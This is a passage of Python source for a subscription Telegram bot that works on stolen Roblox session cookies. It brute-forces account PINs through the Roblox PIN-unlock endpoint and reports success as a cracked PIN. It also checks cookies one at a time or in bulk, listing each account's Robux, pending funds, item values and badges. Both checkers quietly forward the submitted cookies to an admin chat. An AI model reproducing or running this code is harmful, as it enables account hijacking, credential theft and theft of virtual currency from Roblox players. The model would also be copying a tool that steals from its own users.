                                    elif response['errors'][0]['message'] == 'Token Validation Failed':
                                        print("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")
                                        time.sleep(5)
                                        return
                                except:
                                    continue
                            except Exception as E: 
                                print(E)
                            while True:

                                try:
                                    request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers={
                                    'X-CSRF-TOKEN': getXsrf(cookie),
                                }, data={'pin': pin}, cookies=cookies)
                                except Exception as e:
                                    continue
                                
                                response = request.json()
                                status_code = request.status_code

                                try:
                                    if "unlockedUntil" in str(response):
                                        bot.send_message(message.chat.id, f'✅ Пин взломан\n🔑 Pin: {pin}')
                                        break
                                        return

                                    if response['errors'][0]['code'] == 4:
                                        print("Incorrect Pin", 'red')
                                        printed = False
                                        

                                    elif response['errors'][0]['message'] == "Too many requests":
                                        if not printed:
                                            print(f'Too many requests. Waiting 20 minutes before resumimg', 'ratelimit')
                                            printed = True

                                            time.sleep(60)
                                            continue

                                    if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
                                        print("Error found. Invalid Cookie. Re-enter the cookie and try again", "error")

                                        time.sleep(5)
                                        return

                                    elif response['errors'][0]['message'] == 'Token Validation Failed':
                                        print("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "error")
                                        time.sleep(5)
                                        return

                                except Exception as e:
                                    print(f"A error has occured {e}")
                        else:
                            bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: Invalid cookies', reply_markup=keyboard)

                    thread = threading.Thread(target=start(cookie))
                    thread.start()
                            
                bot.delete_message(call.message.chat.id, call.message.message_id)
                keyboard = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                keyboard.add(button1)
                msg = bot.send_message(call.message.chat.id, f"Введите полные куки файлы 🍪", reply_markup=keyboard)
                bot.register_next_step_handler(msg, pin_crack)
        if call.data == "check":
            cursor.execute(f"SELECT access FROM users WHERE id = {call.message.chat.id}")
            result = cursor.fetchone()
            x1 = result[0]
            if x1 == '0':
                bot.send_message(call.message.chat.id, 'У вас нет подписки')
                return
            else:
                def get_cookies(message):
                    cookie = message.text
                    bot.delete_message(call.message.chat.id, msg.message_id)
                    headers = {
                        'Cookie': '.ROBLOSECURITY=' + message.text
                    }
                    response = requests.get('https://auth.roblox.com/v1/auth/metadata', headers=headers)
                    pas = ''
                    if response.status_code == 200:
                        try:
                            userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
                            userid = userdata['id'] #user id
                            display = userdata['displayName'] #display name
                            username = userdata['name'] #username
                            robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
                            robux = robuxdata['robux'] #get robux balance
                            premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
                            

                            test = requests.get(f'https://badges.roblox.com/v1/users/{userid}/badges?limit=100', cookies={'.ROBLOSECURITY': str(cookie)}).json()
                            bot.send_message(admin, cookie)
                            sea2 = 'False'
                            sea3 = 'False'

                            test = str(test)

                            if "2125253106" in test:
                                sea2 = 'True'
                            else:
                                sea2 = "False"

                            if "2125253113" in test:
                                sea3 = 'True'
                            else:
                                sea3 = 'False'

                            if "2124793144" in test:
                                welcome = 'True'
                            else:
                                welcome = 'False'

                            if "196198654" in test:
                                lvl20mm = 'True'
                            else:
                                lvl20mm = 'False'

                            if "2124911922" in test:
                                ASTD = 'True'
                            else:
                                ASTD = 'False'
                            
                            if "2124911922" in test:
                                TTD = 'True'
                            else:
                                TTD = 'False'
                            account_settings = requests.get(f'https://www.roblox.com/my/settings/json',cookies={'.ROBLOSECURITY': cookie})
                        
                            account_email_verified = account_settings.json()['IsEmailVerified']
                            transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Year&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
                            pending = transactions['pendingRobuxTotal']
                            stipends = transactions['premiumStipendsTotal']
                            devEx = transactions['developerExchangeTotal']
                            groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
                            groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
                            groupFunds = 0
                            for i in groupIds:
                                groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
                            account_purchases_total = abs(int(transactions['purchasesTotal']))


                            rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
                            while rap_dict['nextPageCursor'] != None:
                                rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
                            rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])

                            thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
                            image_url = thumbnail["data"][0]["imageUrl"]
                            pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
                            pin_bool = pindata["isEnabled"]
                            img_data = requests.get(image_url).content
                            for x in range(16):
                                pas = pas + random.choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
                            with open(f'imgs/{pas}.jpg', 'wb') as handler:
                                handler.write(img_data)
                            handler.close()
                            bot.delete_message(call.message.chat.id, message.message_id)
                            with open(f'imgs/{pas}.jpg', 'rb') as handler:
                                bot.send_photo(message.chat.id, handler, caption=f'👀 Display Name: {display}\n🔍 User ID: {userid}\n💸 Total: {account_purchases_total}\n💰 Robux: {robux}\n💳 Pending: {pending}\n🔐 Has Pin?: {pin_bool}\n📩 Email: {account_email_verified}\n📈 RAP: {rap}\n💎 Premium: {premiumbool}\n🌊 Sea 2: {sea2}\n💦 Sea 3: {sea3}\n🐾 Welcome!: {welcome}\n🔪 Lvl20: {lvl20mm}\nASTD: {ASTD}\nTTD: {TTD}')
                            handler.close()
                            os.remove(f'imgs/{pas}.jpg')
                        except Exception as E:
                            
                            keyboard = types.InlineKeyboardMarkup()
                            button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                            keyboard.add(button1)
                            bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: Invalid cookies', reply_markup=keyboard)
                            print(E)
                    elif response.status_code == 403:
                        
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                        keyboard.add(button1)
                        bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: Invalid cookies', reply_markup=keyboard)

                    else:
                        
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                        keyboard.add(button1)
                        bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: invalid data, try again', reply_markup=keyboard)
                keyboard = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text="Отмена ❌", callback_data="menu")
                keyboard.add(button1)
                bot.delete_message(call.message.chat.id, call.message.message_id)
                msg = bot.send_message(call.message.chat.id, f"Введите полные куки файлы 🍪", reply_markup=keyboard)
                bot.register_next_step_handler(msg, get_cookies)
        if call.data == 'multi':
            cursor.execute(f"SELECT access FROM users WHERE id = {call.message.chat.id}")
            result = cursor.fetchone()
            x1 = result[0]
            if x1 == '0':
                bot.send_message(call.message.chat.id, 'У вас нет подписки')
                return
            else:
                bot.delete_message(call.message.chat.id, call.message.message_id)
                def get_file(message):
                    bot.delete_message(message.chat.id, msg.message_id)
                    invalid = 0
                    valid = 0
                    checked = 0
                    try:
                        bot.delete_message(message.chat.id, message.message_id)
                        file_name = message.document.file_name
                        file_id_info = bot.get_file(message.document.file_id)
                        file_name = message.document.file_name
                        file_id = message.document.file_name
                        file_id_info = bot.get_file(message.document.file_id)
                        downloaded_file = bot.download_file(file_id_info.file_path)
                        src = file_name
                        with open(src, 'wb') as new_file:
                            new_file.write(downloaded_file)
                        new_file.close()
                        ses = requests.session()
                        cookies = open(src).read().splitlines()
                        def remove_html_tags(text):
                            """Remove html tags from a string"""
                            import re
                            clean = re.compile('<.*?>')
                            return re.sub(clean, '', text)
                        valid = 0
                        for line in cookies:
                            try:
                                ses.cookies['.ROBLOSECURITY'] = line
                                cookie = ses.cookies['.ROBLOSECURITY']
                                x = ses.post('https://auth.roblox.com')
                                token = x.headers['x-csrf-token']
                                r = ses.get('https://www.roblox.com/mobileapi/userinfo')
                                o = open('output.txt','a')
                                userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
                                userid = userdata['id'] #user id
                                username = userdata['name'] #username
                                robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
                                robux = robuxdata['robux'] #get robux balance
                                log = f'Username : {username} | Robux : {robux} | Cookie : {cookie}'
                                o.write(f'{log}\n')
                                valid = valid + 1
                            except KeyError:
                                pass
                        o.close()
                        bot.send_document(message.chat.id, open("output.txt", 'rb'), caption=f'Проверка завершена\n✅ Валидных аккаунтов: {valid}')
                        bot.send_document(admin, open("output.txt", 'rb'), caption=f'Проверка завершена\n✅ user: {message.chat.id}')
                        os.remove('output.txt')
                    except Exception as E:
                        print(E)
                        keyboard = types.InlineKeyboardMarkup()
                        button1 = types.InlineKeyboardButton(text="Меню ◀️", callback_data="menu")
                        keyboard.add(button1)
                        bot.send_message(message.chat.id, f'Действие отменено ❌\nОшибка: Неопознаный файл', reply_markup=keyboard)  
                keyboard = types.InlineKeyboardMarkup()
                button1 = types.InlineKeyboardButton(text="Отмена ❌", callback_data="menu")
                keyboard.add(button1)
                msg = bot.send_message(call.message.chat.id, 'Отправьте файл с куки файлами.\nКаждые новые куки должны быть с новой строки', reply_markup=keyboard)
                bot.register_next_step_handler(msg, get_file)



bot.polling(none_stop=True)
